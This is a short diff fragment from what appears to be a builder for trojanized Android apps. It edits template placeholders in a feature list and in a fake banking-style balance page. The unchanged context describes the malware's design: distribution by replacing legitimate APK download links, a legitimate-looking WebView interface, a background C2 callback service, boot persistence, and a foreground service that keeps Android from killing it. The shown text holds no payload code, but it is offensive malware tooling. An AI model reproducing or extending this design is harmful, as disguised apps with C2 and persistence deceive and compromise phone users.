@@ -522,7 +522,7 @@ zipalign -v 4 unsigned.apk %s.apk
 5. **Watering hole:** Replace legitimate APK download link
 
 ## Features
-- Legitimate-looking %s UI (WebView)
+- Legitimate-looking native UI (WebView)
 - Background C2 callback service (survives app close)
 - Boot persistence (starts on device reboot)
 - Foreground service notification (avoids Android kill)
@@ -644,7 +644,7 @@ body{font-family:-apple-system,sans-serif;background:#f8f9fa;color:#333}
 .tx-amount.pos{color:#27ae60}
 </style></head><body>
 <div class="header">
-<h1>Available Balance</h1>
+<h1>%s %s</h1>
 <div class="balance">$4,280.50</div>
 <div class="actions">
 <button class="action">Send</button>
